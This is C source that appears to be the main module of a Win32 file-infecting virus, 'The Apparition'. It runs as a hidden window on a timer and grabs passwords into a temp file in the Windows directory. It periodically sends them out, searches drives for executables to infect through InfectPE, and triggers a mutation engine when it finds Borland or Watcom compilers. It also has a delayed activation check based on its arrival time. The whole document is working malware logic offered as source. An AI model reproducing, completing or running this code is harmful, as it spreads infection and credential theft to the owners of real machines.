// THE APPARITION for Win32
// by LordAsd

//                            *** ATTENTION ***
//                          *** BUGGY PROGRAM ***
//                        *** OPERATE WITH CARE ***

#include "winapp32.h"
HWND      MainWindow;

#include "scanner.cpp"
#include "diag.cpp"
#include "misc.cpp"
#include "main.cpp"
#include "asmmut.cpp"
#include "mutant.cpp"
#include "password.cpp"
#include "network.cpp"

const char WinApp32WndClass[]="WinApp32WndClassDetect666";

//Declaration
int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE,
          LPSTR lpszCmdLine, int)
{;;
 MSG   msg;;
 DiagInit();;
 strcpy(CommandLine,lpszCmdLine);;
 InitAll();;
 if (!AskBoss("RUN RUN RUN?")) return 0;;
 LoadCarrier();;
 if (FindWindow(WinApp32WndClass,NULL)!=(HWND)0) exit(EXIT_SUCCESS);;
 Log("NR");

 WriteProfileString(WinApp32,Ini_Test,"666");;
 int x = GetProfileInt(WinApp32,Ini_Test,0);;
 if (x!=666) exit(EXIT_SUCCESS);;
 WriteProfileString(WinApp32,Ini_Test,"1313");;
 x = GetProfileInt(WinApp32,Ini_Test,0);;
 if (x!=1313) exit(EXIT_SUCCESS);;
 Log(".INI validated");

 PrepareSearch();;
 // BEGIN TEST

 //  END TEST
 WNDCLASS wcSoundClass;;
 wcSoundClass.lpszClassName = WinApp32WndClass;;
 wcSoundClass.hInstance     = hInstance;;
 wcSoundClass.lpfnWndProc   = MainWndProc;;
 wcSoundClass.hCursor       = LoadCursor(NULL, IDC_ARROW);;
 wcSoundClass.hIcon         = LoadIcon(hInstance, IDI_APPLICATION);;
 wcSoundClass.lpszMenuName  = NULL;;
 wcSoundClass.hbrBackground = GetStockObject(WHITE_BRUSH);;
 wcSoundClass.style         = CS_HREDRAW | CS_VREDRAW;;
 wcSoundClass.cbClsExtra    = 0;;
 wcSoundClass.cbWndExtra    = 0;;
 RegisterClass(&wcSoundClass);;
 MyInstance = hInstance;;

 MainWindow = CreateWindow(WinApp32WndClass,WinApp32WndClass,WS_OVERLAPPEDWINDOW,
                                         CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,
                                         NULL,NULL,hInstance,NULL);;

 ShowWindow(MainWindow, SW_HIDE);;
 UpdateWindow(MainWindow);;

 UINT MyTimerID = random(666)+1;
 SetTimer(MainWindow,MyTimerID,TimerDelay,NULL);;
 while (GetMessage(&msg, NULL, 0, 0))
 {;;
  TranslateMessage(&msg);;
  DispatchMessage(&msg);;
 };;
 KillTimer(MainWindow,MyTimerID);;
 return(msg.wParam);;
};

//Declaration

bool TimerBusy = false;
bool PasswordsSent = false;
int TimerCount = 0;;
#define TransmitRetry 300


void wmTimer()
{;;
 if (TimerBusy) return;;

 TimerCount++;;
 LookForPasswords();;
 if ((!PasswordsSent)&&(TimerCount==TransmitRetry))
  {;; PasswordsSent = SendPasswords();; TimerCount = 0;;};;

 char TargetName[MAX_PATH];;
 TimerBusy = true;;
 switch (GetNextName(TargetName))
 {
  case -1 : PrepareSearch();; break;
  case  1 : ProcessFile(TargetName);; break;
 };;
 TimerBusy = false;;
};

//Declaration
LRESULT CALLBACK _export MainWndProc(HWND hWnd, UINT message,
 WPARAM wParam, LPARAM lParam)
{;;
 switch (message)
 {
  case WM_TIMER:   wmTimer();; break;
  case WM_CREATE:  return(DefWindowProc(hWnd, message, wParam, lParam));
  case WM_DESTROY: PostQuitMessage(0);; break;
  case WM_CLOSE:   DestroyWindow(hWnd);; break;
  default:         return(DefWindowProc(hWnd, message, wParam, lParam));
 };;
 return(0L);;
};

//Declaration
void InitAll()
{
 char hhh[666];;
 // Obtain filename & remove double quotes from it
 bool quoted = false;;
 char* x=GetCommandLine();;
 sprintf(hhh,"Command line %s",x);;
 Log(hhh);;
 if ((*x)=='\"') {;; x++;; quoted=true;; };;
 strcpy(MyName,x);;
 x = MyName;;
 while ( (*x)!=0x0)
 {;;
  if ( (!quoted)&&((*x)==0x20) ) break;;
  if (quoted && ((*x)=='\"')) break;;
  x++;;
 };;
 if ((*(x-1))=='\"') x--;;
 (*x)=0x00;;

 if (SearchPath(NULL,MyName,".EXE",666,hhh,&x)!=0) strcpy(MyName,hhh);;

 sprintf(hhh,"File name : %s",MyName);
 Log(hhh);
 // Set errors handling mode
 SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT |
                                         SEM_NOOPENFILEERRORBOX  );;
 // Set up password grabber
 strcpy(PasswordFileName,"");;
 strcpy(LastSavedPassword,"");;
 if (GetWindowsDirectory(PasswordFileName,666)!=0)
  strcat(PasswordFileName,"\\LA~P0013.TMP");;
 // System detection
 OSVERSIONINFO v;;
 v.dwOSVersionInfoSize = sizeof(v);;

typedef bool (__stdcall *GetVersionExProc)(LPOSVERSIONINFO);;
  GetVersionExProc V_Ex = (GetVersionExProc)GetProcAddress
    (GetModuleHandle("KERNEL32"),"GetVersionExA");;

 if (V_Ex!=NULL) (*V_Ex)(&v);;
 if (V_Ex==NULL) Log("GetProcAddress failed");;
 if (v.dwPlatformId==1) System = SYSTEM_WIN95;;
 if (v.dwPlatformId==2) System = SYSTEM_WINNT;;

 if (System==SYSTEM_WIN95) // for Win95 systems only
 {;;
  DWORD tid = GetCurrentThreadId();;
#ifdef WATCOM_MODE
extern DWORD GetFuckValue();
#pragma aux GetFuckValue = \
      "mov  eax,fs:[18h]"  \
      "sub  eax,10h"       \
      "xor  eax,[tid]"     \
      "mov  [Fuck],eax"    \
      value [eax]          \
      modify [eax];
      GetFuckValue();;
#else
  asm
  {
      mov  eax,fs:[18h]
      sub  eax,10h
      xor  eax,[tid]
      mov  [Fuck],eax
  };;
#endif
  DWORD* fl = (DWORD*)((GetCurrentProcessId() ^ Fuck)+0x20);;
  (*fl)|=0x100;;
 };;

 // Misc Misc
 NoInfect =  (GetProfileInt(WinApp32,Ini_NoInfect,0)==1);;
#ifdef WATCOM_MODE
 srand(GetTickCount());;
#else
 randomize();;
#endif
 DWORD CurrentTime;;
 DWORD ArrivalTime;;
 DWORD ActivationDelay = 10000000L;;
 ActivationDelay = (ActivationDelay>>16);;
 ActivationDelay *= 60L * 60L * 24L * 10L;;
 ActivationDelay = (ActivationDelay>>16);;
 FILETIME Time;;
 iGetSystemTimeAsFileTime(&Time);
 CurrentTime = Time.dwHighDateTime;;
 GetProfileString(WinApp32,Arrived,"",hhh,666);;
 char* endptr;;
 ArrivalTime = strtoul(hhh,&endptr,10);;
 if (ArrivalTime==0)
 {;;
  sprintf(hhh,"%u",CurrentTime);;
  WriteProfileString(WinApp32,Arrived,hhh);;
  Log("Arrived!",PasswordFileName);;
 }
 else
  TimeToGo = (CurrentTime - (ArrivalTime + ActivationDelay)) > 0;;
};


//Declaration

void ProcessFile(char* TargetName)
{;;
 Log(TargetName);;
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 fnsplit(TargetName,Drive,Dir,Name,Ext);;
 if ((stricmp(Ext,".CTL")==0)&&(stricmp(Name,"EVENTS")==0))
  ProcessEventsCtl(TargetName);;
 if (stricmp(Ext,".EXE")==0)
 { // EXE extension
  if (stricmp(Name,"BCC32")==0)
  { // BC compiler
        CurrentCompiler = COMPILER_BORLAND;;
        sprintf(CRoot,"%s%s..",Drive,Dir);;
        PermutationEngine();;
        return;;
  };;
  if (stricmp(Name,"WPP386")==0)
  { // Watcom compiler
        CurrentCompiler = COMPILER_WATCOM;;
        sprintf(CRoot,"%s%s..",Drive,Dir);;
        PermutationEngine();;
        return;;
  };;
  if (DetectFileFormat(TargetName)==FILE_FORMAT_PE) InfectPE(TargetName);;
 };;// EXE extension
};

